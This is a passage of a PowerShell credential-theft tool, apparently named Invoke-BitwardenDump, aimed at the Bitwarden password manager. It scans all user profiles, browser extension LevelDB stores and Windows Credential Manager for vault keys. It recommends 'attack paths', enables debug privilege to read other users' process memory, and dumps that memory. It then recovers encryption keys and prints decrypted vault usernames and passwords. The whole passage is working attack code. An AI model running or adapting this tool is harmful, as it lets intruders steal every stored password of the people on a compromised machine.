    switch ($parsed.Type) {
        2 {
            $iv  = [Convert]::FromBase64String($parsed.IV)
            $ct  = [Convert]::FromBase64String($parsed.CT)
            $mac = if ($parsed.MAC) { [Convert]::FromBase64String($parsed.MAC) } else { $null }
            $plainBytes = Decrypt-AesCbc256 -EncKey $EncKey -MacKey $MacKey -IV $iv -CT $ct -MAC $mac
            if ($plainBytes) { return [System.Text.Encoding]::UTF8.GetString($plainBytes) }
        }
        0 {
            $raw = [Convert]::FromBase64String($parsed.Data)
            if ($raw.Length -lt 16) { return $null }
            $iv = $raw[0..15]
            $ct = $raw[16..($raw.Length - 1)]
            $plainBytes = Decrypt-AesCbc256 -EncKey $EncKey -MacKey $null -IV $iv -CT $ct -MAC $null
            if ($plainBytes) { return [System.Text.Encoding]::UTF8.GetString($plainBytes) }
        }
    }
    return $null
}

function Decrypt-EncStringToBytes {
    param(
        [string]$EncString,
        [byte[]]$EncKey,
        [byte[]]$MacKey
    )
    $parsed = Split-EncString $EncString
    if (-not $parsed) { return $null }
    if ($parsed.Type -eq 2) {
        $iv  = [Convert]::FromBase64String($parsed.IV)
        $ct  = [Convert]::FromBase64String($parsed.CT)
        $mac = if ($parsed.MAC) { [Convert]::FromBase64String($parsed.MAC) } else { $null }
        return Decrypt-AesCbc256 -EncKey $EncKey -MacKey $MacKey -IV $iv -CT $ct -MAC $mac
    }
    return $null
}

function Decrypt-RsaOaepSha1 {
    param([byte[]]$CT, [byte[]]$PrivateKeyDer)
    try {
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.ImportPkcs8PrivateKey($PrivateKeyDer, [ref]$null)
        $plain = $rsa.Decrypt($CT, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
        $rsa.Dispose()
        return $plain
    } catch {
        Write-Verbose "RSA-OAEP-SHA1 decryption failed: $_"
        return $null
    }
}

function Get-KeyParts {
    param([byte[]]$KeyBytes)
    if ($KeyBytes.Length -lt 32) { return $null }
    $encKey = New-Object byte[] 32
    [Array]::Copy($KeyBytes, 0, $encKey, 0, 32)
    $macKey = $null
    if ($KeyBytes.Length -ge 64) {
        $macKey = New-Object byte[] 32
        [Array]::Copy($KeyBytes, 32, $macKey, 0, 32)
    }
    return @{ EncKey = $encKey; MacKey = $macKey }
}

# ============================================================================
#  Recon Mode
# ============================================================================

function Invoke-BWRecon {
    Write-Status "RECONNAISSANCE" "header"

    # --- Bitwarden Processes ---
    Write-Status "BITWARDEN PROCESSES" "header"
    $bwProcesses = @()
    $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $_.ProcessName -match '(?i)bitwarden|bw'
    }
    if ($procs) {
        foreach ($p in $procs) {
            $owner = Get-ProcessOwner -ProcessId $p.Id
            $memMB = [math]::Round($p.WorkingSet64 / 1MB, 1)
            $cmdLine = ""
            try {
                $wmi = Get-CimInstance Win32_Process -Filter "ProcessId = $($p.Id)" -ErrorAction Stop
                $cmdLine = $wmi.CommandLine
            } catch {}
            $info = [PSCustomObject]@{
                PID = $p.Id; Name = $p.ProcessName; Owner = $owner
                MemoryMB = $memMB; CommandLine = $cmdLine
            }
            $bwProcesses += $info
            Write-Status "PID $($p.Id) | $($p.ProcessName) | Owner: $owner | Mem: ${memMB}MB" "good"
            if ($cmdLine) { Write-Status "  CMD: $cmdLine" "info" }
        }
    } else {
        Write-Status "No Bitwarden processes found" "warn"
    }

    # --- Desktop App ---
    Write-Status "DESKTOP APP" "header"
    $desktopPaths = @(
        "$env:ProgramFiles\Bitwarden\Bitwarden.exe",
        "${env:ProgramFiles(x86)}\Bitwarden\Bitwarden.exe",
        "$env:LOCALAPPDATA\Programs\Bitwarden\Bitwarden.exe",
        "$env:LOCALAPPDATA\Bitwarden\Bitwarden.exe"
    )
    $desktopFound = $false
    foreach ($dp in $desktopPaths) {
        if (Test-Path $dp) {
            $ver = (Get-Item $dp).VersionInfo.ProductVersion
            Write-Status "Desktop app found: $dp (v$ver)" "good"
            $desktopFound = $true
            break
        }
    }
    if (-not $desktopFound) {
        Write-Status "Desktop app not found in standard paths" "warn"
    }

    # --- data.json ---
    Write-Status "DATA.JSON ANALYSIS" "header"
    $dataJsonPaths = @()
    $userProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($profile in $userProfiles) {
        $djPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden\data.json"
        if (Test-Path $djPath) { $dataJsonPaths += $djPath }
        $cliPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden CLI\data.json"
        if (Test-Path $cliPath) { $dataJsonPaths += $cliPath }
    }
    $script:dataJsonInfo = @()
    foreach ($djp in $dataJsonPaths) {
        Write-Status "Found: $djp" "good"
        try {
            $json = Get-Content $djp -Raw -ErrorAction Stop | ConvertFrom-Json
            $allProps = @{}
            $json.PSObject.Properties | ForEach-Object { $allProps[$_.Name] = $_.Value }

            # Find active user and all user IDs
            $activeUserId = $null
            if ($allProps.ContainsKey('global_account_activeAccountId')) {
                $activeUserId = $allProps['global_account_activeAccountId']
            }
            $allUserIds = @()
            if ($activeUserId) { $allUserIds += $activeUserId }
            $allProps.Keys | ForEach-Object {
                if ($_ -match '^user_([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})_') {
                    if ($Matches[1] -notin $allUserIds) { $allUserIds += $Matches[1] }
                }
                if ($_ -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                    if ($_ -notin $allUserIds) { $allUserIds += $_ }
                }
            }

            foreach ($userId in $allUserIds) {
                $info = @{ UserId = $userId; Path = $djp; Email = ""; Timeout = ""; HasCiphers = $false; HasPrivateKey = $false; HasPinUnlock = $false; CipherCount = 0; KDF = "" }

                # Modern flat keys
                $accountsKey = 'global_account_accounts'
                if ($allProps.ContainsKey($accountsKey) -and $allProps[$accountsKey] -is [PSObject]) {
                    $accts = $allProps[$accountsKey]
                    if ($accts.PSObject.Properties[$userId]) {
                        $acct = $accts.$userId
                        if ($acct.PSObject.Properties['email']) { $info.Email = $acct.email }
                        elseif ($acct.PSObject.Properties['name']) { $info.Email = $acct.name }
                    }
                }
                $toKey = "user_${userId}_vaultTimeoutSettings_vaultTimeout"
                if ($allProps.ContainsKey($toKey)) { $info.Timeout = "$($allProps[$toKey])" }
                $cryptoKey = "user_${userId}_crypto_accountCryptographicState"
                if ($allProps.ContainsKey($cryptoKey)) { $info.HasPrivateKey = $true }
                $ciphersKey = "user_${userId}_ciphers_ciphers"
                if ($allProps.ContainsKey($ciphersKey) -and $allProps[$ciphersKey] -is [PSObject]) {
                    $info.HasCiphers = $true
                    $info.CipherCount = ($allProps[$ciphersKey].PSObject.Properties | Measure-Object).Count
                }
                $pinKey = "user_${userId}_pinUnlock_pinKeyEncryptedUserKeyPersistent"
                if ($allProps.ContainsKey($pinKey) -and $allProps[$pinKey]) { $info.HasPinUnlock = $true }
                $kdfKey = "user_${userId}_kdfConfig_kdfConfig"
                if ($allProps.ContainsKey($kdfKey) -and $allProps[$kdfKey] -is [PSObject]) {
                    $kdf = $allProps[$kdfKey]
                    $kdfType = if ($kdf.PSObject.Properties['kdfType']) { $kdf.kdfType } else { "?" }
                    $kdfIter = if ($kdf.PSObject.Properties['iterations']) { $kdf.iterations } else { "?" }
                    $info.KDF = "type=$kdfType iter=$kdfIter"
                }

                $timeoutStr = if ($info.Timeout -eq '' -or $info.Timeout -eq $null) { "UNKNOWN" }
                              elseif ($info.Timeout -match '^-1$|^null$|^never$') { "NEVER (auto-unlock)" }
                              else { "$($info.Timeout)" }
                $emailStr = if ($info.Email) { $info.Email } else { "unknown" }
                Write-Status "  User: $emailStr ($userId)" "info"
                Write-Status "    Timeout: $timeoutStr | PrivKey: $($info.HasPrivateKey) | Ciphers: $($info.CipherCount) | PIN: $($info.HasPinUnlock) | KDF: $($info.KDF)" "info"
                $script:dataJsonInfo += $info
            }
        } catch {
            Write-Status "  Failed to parse: $_" "bad"
        }
    }
    if (-not $dataJsonPaths) { Write-Status "No data.json found" "warn" }

    # --- Browser Extensions ---
    Write-Status "BROWSER EXTENSIONS" "header"
    $extPaths = @{
        "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
    }
    $extIds = @{
        "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
        "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
        "Brave"   = "nngceckbapebfimnlniiiahkandclblb"
        "Vivaldi" = "nngceckbapebfimnlniiiahkandclblb"
    }
    $script:browserExtPaths = @()
    foreach ($browser in $extPaths.Keys) {
        $userData = $extPaths[$browser]
        if (-not (Test-Path $userData)) { continue }
        $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
        foreach ($prof in $profiles) {
            $extPath = Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])"
            if (Test-Path $extPath) {
                Write-Status "Bitwarden extension ($browser - $prof): $extPath" "good"
                $script:browserExtPaths += @{ Browser = $browser; Profile = $prof; Path = $extPath }
                $ldbFiles = Get-ChildItem $extPath -Filter "*.ldb" -ErrorAction SilentlyContinue
                $logFiles = Get-ChildItem $extPath -Filter "*.log" -ErrorAction SilentlyContinue
                Write-Status "  LDB files: $($ldbFiles.Count) | LOG files: $($logFiles.Count)" "info"
            }
        }
    }
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($fp in $firefoxProfiles) {
        $fxExt = Join-Path $fp.FullName "storage\default\moz-extension*"
        $fxDirs = Get-ChildItem $fxExt -Directory -ErrorAction SilentlyContinue
        foreach ($d in $fxDirs) {
            if (Test-Path (Join-Path $d.FullName "idb")) {
                Write-Status "Firefox extension (possible): $($d.FullName)" "warn"
            }
        }
    }

    # --- Credential Manager ---
    Write-Status "CREDENTIAL MANAGER" "header"
    $script:credEntries = @()
    foreach ($filter in @("Bitwarden*", "bitwarden*")) {
        try {
            $creds = [BW.CredMgr]::Enumerate($filter)
            foreach ($c in $creds) {
                if ($c.TargetName -notin ($script:credEntries | ForEach-Object { $_.TargetName })) {
                    $script:credEntries += $c
                }
            }
        } catch {}
    }
    if ($script:credEntries.Count -gt 0) {
        foreach ($ce in $script:credEntries) {
            $blobLen = if ($ce.Blob) { $ce.Blob.Length } else { 0 }
            $marker = ""
            if ($ce.TargetName -match 'auto') { $marker = " *** AUTO-UNLOCK KEY ***" }
            elseif ($ce.TargetName -match 'biometric') { $marker = " (biometric key)" }
            Write-Status "Target: $($ce.TargetName) | User: $($ce.UserName) | BlobSize: ${blobLen}B$marker" "good"
        }
    } else {
        Write-Status "No Bitwarden entries in Credential Manager" "warn"
    }

    # --- LevelDB Key Scan ---
    Write-Status "LEVELDB KEY SCAN (Browser Extension)" "header"
    foreach ($ext in $script:browserExtPaths) {
        Write-Status "Scanning $($ext.Browser) ($($ext.Profile))..." "info"
        $found = Scan-LevelDbForKeys -ExtPath $ext.Path
        foreach ($f in $found) {
            Write-Status "  Found: $($f.Type) | Key: $($f.Key) | Value length: $($f.ValueLen)" $(if ($f.Type -match 'user_auto') { "good" } else { "info" })
        }
        if (-not $found) { Write-Status "  No sensitive keys found in LevelDB" "warn" }
    }

    # --- Attack Path Recommendations ---
    Write-Status "ATTACK PATH RECOMMENDATIONS" "header"
    $autoKeyCred = $script:credEntries | Where-Object { $_.TargetName -match 'auto' }
    if ($autoKeyCred) {
        Write-Status "OFFLINE DECRYPT POSSIBLE - Credential Manager has auto-unlock key" "good"
        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Offline" "info"
    }
    foreach ($ext in $script:browserExtPaths) {
        $found = Scan-LevelDbForKeys -ExtPath $ext.Path
        $autoKey = $found | Where-Object { $_.Type -match 'user_auto' }
        if ($autoKey) {
            Write-Status "OFFLINE DECRYPT POSSIBLE - Browser extension ($($ext.Browser)) has plaintext auto-unlock key in LevelDB!" "good"
            Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Offline" "info"
        }
    }
    if ($bwProcesses) {
        $main = $bwProcesses | Sort-Object MemoryMB -Descending | Select-Object -First 1
        Write-Status "MEMORY DUMP POSSIBLE - Bitwarden desktop PID $($main.PID) ($($main.Owner), $($main.MemoryMB)MB)" "warn"
        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
    }
    $browserNames = @{ "chrome" = "Chrome"; "brave" = "Brave"; "msedge" = "Edge"; "firefox" = "Firefox"; "vivaldi" = "Vivaldi" }
    foreach ($pname in $browserNames.Keys) {
        $bp = Get-Process -Name $pname -ErrorAction SilentlyContinue
        if ($bp -and $script:browserExtPaths) {
            $matching = $script:browserExtPaths | Where-Object { $_.Browser -eq $browserNames[$pname] }
            if ($matching) {
                Write-Status "BROWSER DUMP POSSIBLE - $($browserNames[$pname]) ($($bp.Count) procs, extension installed)" "warn"
                Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
            }
        }
    }
    if (-not $autoKeyCred -and -not $bwProcesses -and -not $script:browserExtPaths) {
        Write-Status "No attack paths identified on this machine" "bad"
    }
}

function Scan-LevelDbForKeys {
    param([string]$ExtPath)
    $results = @()
    $patterns = @(
        @{ Pattern = '_user_auto';        Type = 'user_auto' },
        @{ Pattern = '_user_biometric';   Type = 'user_biometric' },
        @{ Pattern = 'userKey';           Type = 'userKey' },
        @{ Pattern = 'session-key';       Type = 'session_key' },
        @{ Pattern = 'masterKey';         Type = 'masterKey' }
    )
    $files = Get-ChildItem $ExtPath -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in @('.ldb', '.log', '.sst') }
    foreach ($f in $files) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            foreach ($pat in $patterns) {
                $idx = $text.IndexOf($pat.Pattern, [StringComparison]::OrdinalIgnoreCase)
                while ($idx -ge 0) {
                    $contextStart = [Math]::Max(0, $idx - 20)
                    $contextEnd = [Math]::Min($text.Length, $idx + $pat.Pattern.Length + 500)
                    $context = $text.Substring($contextStart, $contextEnd - $contextStart)
                    $valLen = 0
                    if ($context -match '[A-Za-z0-9+/=]{44,}') {
                        $valLen = $Matches[0].Length
                    }
                    $results += [PSCustomObject]@{
                        Type = $pat.Type; Key = $pat.Pattern
                        File = $f.Name; Offset = $idx; ValueLen = $valLen
                    }
                    $nextSearch = $idx + $pat.Pattern.Length
                    if ($nextSearch -ge $text.Length) { break }
                    $idx = $text.IndexOf($pat.Pattern, $nextSearch, [StringComparison]::OrdinalIgnoreCase)
                }
            }
        } catch { Write-Verbose "Failed to read $($f.FullName): $_" }
    }
    return $results | Sort-Object Type -Unique
}

# ============================================================================
#  Dump Mode (Memory)
# ============================================================================

function Scan-ProcessMemory {
    param(
        [System.Diagnostics.Process]$Target,
        [ref]$Credentials,
        [bool]$DoSaveDump,
        [string]$Label,
        [ref]$DumpFilePath
    )

    $owner = Get-ProcessOwner -ProcessId $Target.Id
    $memMB = [math]::Round($Target.WorkingSet64 / 1MB, 1)
    Write-Status "Target: PID $($Target.Id) | $($Target.ProcessName) | Owner: $owner | Mem: ${memMB}MB | $Label" "info"

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($owner -ne "UNKNOWN" -and $owner -ne $currentUser) {
        Write-Status "Cross-user dump: enabling SeDebugPrivilege..." "warn"
        if ([BW.Mem]::EnableDebugPrivilege()) {
            Write-Status "SeDebugPrivilege enabled" "good"
        } else {
            Write-Status "Failed to enable SeDebugPrivilege - need Admin/SYSTEM" "bad"
            return
        }
    }

    $hProc = [BW.Mem]::Open($Target.Id)
    if ($hProc -eq [IntPtr]::Zero) {
        Write-Status "Failed to open PID $($Target.Id) (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))" "warn"
        return
    }

    $regions = [BW.Mem]::GetRegions($hProc)
    Write-Status "  Regions: $($regions.Count) | Readable: $([math]::Round(($regions | ForEach-Object { $_[1] } | Measure-Object -Sum).Sum / 1MB, 1))MB" "info"

    # Always write a temp dump for crypto analysis; keep it if -SaveDump
    $tempDump = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "bw_$($Target.Id)_$(Get-Random).raw")
    $dumpStream = [System.IO.File]::Create($tempDump)

    $before = $Credentials.Value.Count
    foreach ($region in $regions) {
        $baseAddr = $region[0]
        $size = [int][Math]::Min($region[1], 10 * 1024 * 1024)
        $data = [BW.Mem]::ReadRegion($hProc, $baseAddr, $size)
        if (-not $data -or $data.Length -eq 0) { continue }
        $dumpStream.Write($data, 0, $data.Length)
        $str = [System.Text.Encoding]::UTF8.GetString($data)
        Find-CredentialPatterns -Text $str -Credentials $Credentials
        $str16 = [System.Text.Encoding]::Unicode.GetString($data)
        Find-CredentialPatterns -Text $str16 -Credentials $Credentials
    }
    $dumpStream.Close()
    [BW.Mem]::Close($hProc)

    $dumpSize = (Get-Item $tempDump).Length
    Write-Status "  Memory captured: $([math]::Round($dumpSize / 1MB, 1))MB" "info"

    if ($DumpFilePath) { $DumpFilePath.Value = $tempDump }

    if ($DoSaveDump) {
        $savedPath = "$($Target.ProcessName)_$($Target.Id).dmp"
        Copy-Item $tempDump $savedPath -Force
        Write-Status "  Dump saved: $savedPath" "good"
    }

    $found = $Credentials.Value.Count - $before
    Write-Status "  Raw matches: $found" $(if ($found -gt 0) { "good" } else { "info" })
}

function Invoke-BWDump {
    param([int]$TargetPid, [bool]$DoSaveDump, [string]$OutFile)

    Write-Status "MEMORY DUMP" "header"

    $credentials = @()

    # --- Desktop app processes ---
    $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
    $dumpFiles = @()

    if ($TargetPid -gt 0) {
        $allProcs = Get-Process -ErrorAction SilentlyContinue
        $target = $allProcs | Where-Object { $_.Id -eq $TargetPid }
        if (-not $target) {
            Write-Status "PID $TargetPid not found" "bad"
            return
        }
        $dmpPath = $null
        Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Manual PID" -DumpFilePath ([ref]$dmpPath)
        if ($dmpPath) { $dumpFiles += $dmpPath }
    } else {
        if ($bwProcs) {
            $target = $bwProcs | Sort-Object WorkingSet64 -Descending | Select-Object -First 1
            Write-Status "DESKTOP APP" "header"
            $dmpPath = $null
            Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Desktop" -DumpFilePath ([ref]$dmpPath)
            if ($dmpPath) { $dumpFiles += $dmpPath }
        } else {
            Write-Status "No Bitwarden desktop process found" "info"
        }

        # --- Browser extension processes ---
        Write-Status "BROWSER EXTENSIONS (Memory)" "header"
        $browserPatterns = @{
            "Chrome"  = '^chrome$'
            "Brave"   = '^brave$'
            "Edge"    = '^msedge$'
            "Firefox" = '^firefox$'
            "Vivaldi" = '^vivaldi$'
        }
        $extIds = @{
            "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
            "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
            "Brave"   = "nngceckbapebfimnlniiiahkandclblb"
            "Vivaldi" = "nngceckbapebfimnlniiiahkandclblb"
        }
        $browsersFound = $false
        foreach ($browser in $browserPatterns.Keys) {
            $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match $browserPatterns[$browser] }
            if (-not $procs) { continue }

            $hasExt = $false
            if ($extIds.ContainsKey($browser)) {
                $userData = switch ($browser) {
                    "Chrome"  { "$env:LOCALAPPDATA\Google\Chrome\User Data" }
                    "Edge"    { "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
                    "Brave"   { "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
                    "Vivaldi" { "$env:LOCALAPPDATA\Vivaldi\User Data" }
                    default   { "" }
                }
                if ($userData -and (Test-Path $userData)) {
                    $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                    foreach ($prof in $profiles) {
                        if (Test-Path (Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])")) {
                            $hasExt = $true; break
                        }
                    }
                }
            }
            if ($browser -eq "Firefox") {
                $fxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
                foreach ($fp in $fxProfiles) {
                    if (Get-ChildItem (Join-Path $fp.FullName "storage\default\moz-extension*") -Directory -ErrorAction SilentlyContinue) {
                        $hasExt = $true; break
                    }
                }
            }

            if (-not $hasExt) {
                Write-Verbose "$browser running but no Bitwarden extension found, skipping"
                continue
            }

            $browsersFound = $true
            $targets = @()
            if ($browser -ne "Firefox") {
                foreach ($p in $procs) {
                    try {
                        $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" -ErrorAction SilentlyContinue).CommandLine
                        if ($cmd -match '--extension-process') {
                            $targets += $p
                        }
                    } catch {}
                }
                if ($targets.Count -gt 0) {
                    $targets = $targets | Sort-Object WorkingSet64 -Descending
                    Write-Status "$browser ($($procs.Count) procs, $($targets.Count) extension process(es))" "info"
                } else {
                    $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
                    Write-Status "$browser ($($procs.Count) procs, no --extension-process flag, scanning top 3)" "info"
                }
            } else {
                $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
                Write-Status "$browser ($($procs.Count) procs, scanning top 3)" "info"
            }
            foreach ($t in $targets) {
                $before = $credentials.Count
                $dmpPath = $null
                Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext" -DumpFilePath ([ref]$dmpPath)
                if ($dmpPath) { $dumpFiles += $dmpPath }
                if ($credentials.Count -gt $before) {
                    Write-Status "  Vault data found, skipping remaining $browser extension processes" "good"
                    break
                }
            }
        }
        if (-not $browsersFound) {
            Write-Status "No browsers with Bitwarden extension detected" "info"
        }
    }

    if ($credentials.Count -eq 0 -and -not $bwProcs -and -not $TargetPid -and $dumpFiles.Count -eq 0) {
        Write-Status "No Bitwarden processes (desktop or browser) found" "bad"
        return
    }

    # Filter plaintext credentials
    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
    $filtered = $credentials | Where-Object {
        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
    }
    $plaintextCreds = @($filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
    if ($plaintextCreds.Count -gt 0) {
        Write-Status "Found $($plaintextCreds.Count) plaintext credential(s)" "good"
    } else {
        Write-Status "No plaintext credentials (vault likely locked — running crypto extraction)" "info"
    }

    # ── Crypto extraction on each dump ──────────────────────────────────
    $logAction = [System.Action[string]]{ param($msg) Write-Status $msg "info" }
    $allCryptoDecrypted = @()

    foreach ($dmpFile in $dumpFiles) {
        if (-not (Test-Path $dmpFile)) { continue }
        $dmpSize = (Get-Item $dmpFile).Length
        if ($dmpSize -lt 1MB) { continue }

        Write-Status "CRYPTO EXTRACTION ($([math]::Round($dmpSize / 1MB, 1))MB)" "header"

        # Extract EncStrings
        $encStrings = [BW.DumpCrypto]::ExtractEncStrings($dmpFile)
        Write-Status "EncStrings found: $($encStrings.Count)" $(if ($encStrings.Count -gt 0) {"good"} else {"info"})

        if ($encStrings.Count -lt 2) {
            Write-Status "Not enough EncStrings for crypto extraction" "info"
            continue
        }

        # Multi-round key discovery + decryption
        $allDecrypted = [System.Collections.Generic.List[object]]::new()
        $remaining = $encStrings
        $keyRound = 0
        $previousMacKey = $null

        while ($remaining.Count -ge 2) {
            $keyRound++
            $keyLabel = "Key#$keyRound"
            Write-Status "Searching for $keyLabel ($($remaining.Count) EncStrings)..." "info"

            $foundKey = $null
            if ($keyRound -eq 1) {
                $foundKey = [BW.DumpCrypto]::FindKeys($dmpFile, $remaining, $logAction)
            } else {
                $foundKey = [BW.DumpCrypto]::FindAdditionalKey($dmpFile, $remaining, $previousMacKey, $logAction)
            }

            if (-not $foundKey) {
                Write-Status "No more keys found ($($remaining.Count) EncStrings undecryptable)" "warn"
                break
            }

            $previousMacKey = $foundKey.MacKey
            Write-Status "$keyLabel found!" "good"
            Write-Status "  encKey: $([Convert]::ToBase64String($foundKey.EncKey))" "info"
            Write-Status "  macKey: $([Convert]::ToBase64String($foundKey.MacKey))" "info"
            Write-Status "  Matching: $($foundKey.MatchedEncStrings) EncStrings" "info"

            $roundResults = [BW.DumpCrypto]::DecryptAll($remaining, $foundKey.EncKey, $foundKey.MacKey, $keyLabel, $logAction)
            foreach ($entry in $roundResults) { $allDecrypted.Add($entry) }
            $remaining = [BW.DumpCrypto]::GetRemaining($remaining, $roundResults)
            Write-Status "Round ${keyRound}: $($roundResults.Count) decrypted, $($remaining.Count) remaining" "info"

            if ($keyRound -ge 5) { break }
        }

        # Collect decrypted values
        $decryptedValues = @{}
        foreach ($entry in $allDecrypted) {
            if (-not $entry.IsPerItemKey -and $entry.Plaintext -and $entry.Plaintext.Length -gt 0 -and $entry.Plaintext.Length -lt 1000) {
                $decryptedValues[$entry.EncString] = $entry.Plaintext
            }
        }

        # Try cipher JSON association
        $fileSize = $dmpSize
        $cipherCreds = @()
        $cipherJsonRe = [regex]::new('"id"\s*:\s*"[0-9a-f-]{36}"[^{}]{0,500}"login"\s*:\s*\{[^{}]{0,2000}\}', [System.Text.RegularExpressions.RegexOptions]::Compiled)
        $nameRe  = [regex]::new('"name"\s*:\s*"(2\.[^"]+)"')
        $userRe  = [regex]::new('"username"\s*:\s*"(2\.[^"]+)"')
        $passRe  = [regex]::new('"password"\s*:\s*"(2\.[^"]+)"')
        $uriRe   = [regex]::new('"uri"\s*:\s*"(2\.[^"]+)"')
        $stream2 = [System.IO.File]::OpenRead($dmpFile)
        $position = 0
        while ($position -lt $fileSize) {
            $readSize = [int][Math]::Min(10MB + 8192, $fileSize - $position)
            $buf = New-Object byte[] $readSize
            $stream2.Position = $position
            $br = $stream2.Read($buf, 0, $readSize)
            if ($br -eq 0) { break }
            $chunk = [System.Text.Encoding]::ASCII.GetString($buf, 0, $br)
            foreach ($cm in $cipherJsonRe.Matches($chunk)) {
                $cj = $cm.Value
                $nm = $nameRe.Match($cj); $um = $userRe.Match($cj); $pm = $passRe.Match($cj); $urlm = $uriRe.Match($cj)
                if ($pm.Success -or $um.Success) {
                    $cipherCreds += [PSCustomObject]@{
                        Name     = if ($nm.Success -and $decryptedValues.ContainsKey($nm.Groups[1].Value)) { $decryptedValues[$nm.Groups[1].Value] } else { "" }
                        URL      = if ($urlm.Success -and $decryptedValues.ContainsKey($urlm.Groups[1].Value)) { $decryptedValues[$urlm.Groups[1].Value] } else { "" }
                        Username = if ($um.Success -and $decryptedValues.ContainsKey($um.Groups[1].Value)) { $decryptedValues[$um.Groups[1].Value] } else { "" }
                        Password = if ($pm.Success -and $decryptedValues.ContainsKey($pm.Groups[1].Value)) { $decryptedValues[$pm.Groups[1].Value] } else { "" }
                    }
                }
            }
            $position += 10MB
        }
        $stream2.Close()

        $allCryptoDecrypted += @{ Decrypted = $allDecrypted; Values = $decryptedValues; CipherCreds = $cipherCreds; Remaining = $remaining.Count; Total = $encStrings.Count }

        Write-Status "Crypto: $($allDecrypted.Count)/$($encStrings.Count) decrypted" "good"
    }

    # Clean up temp dumps (unless -SaveDump)
    foreach ($dmpFile in $dumpFiles) {
        if (-not $DoSaveDump) {
            try { Remove-Item $dmpFile -Force -ErrorAction SilentlyContinue } catch {}
        }
    }

    # ── Output ──────────────────────────────────────────────────────────
    Write-Status "EXTRACTED CREDENTIALS" "header"

    # Structured cipher creds from crypto
    $allCipherCreds = @()
    $allUniqueValues = @()
    foreach ($cr in $allCryptoDecrypted) {
        $allCipherCreds += $cr.CipherCreds
        $allUniqueValues += @($cr.Values.Values | Sort-Object -Unique | Where-Object { $_.Trim().Length -gt 0 })
    }
    $allUniqueValues = @($allUniqueValues | Sort-Object -Unique)

    if ($allCipherCreds.Count -gt 0) {
        Write-Status "STRUCTURED CREDENTIALS (decrypted from vault)" "header"
        $i = 0
        foreach ($cred in $allCipherCreds) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Decrypted)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
        }
        Write-Host ""
    }

    if ($plaintextCreds.Count -gt 0) {
        Write-Status "PLAINTEXT CREDENTIALS (from memory)" "header"
        $i = 0
        foreach ($cred in $plaintextCreds) {
            $i++
            Write-Host ""
            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
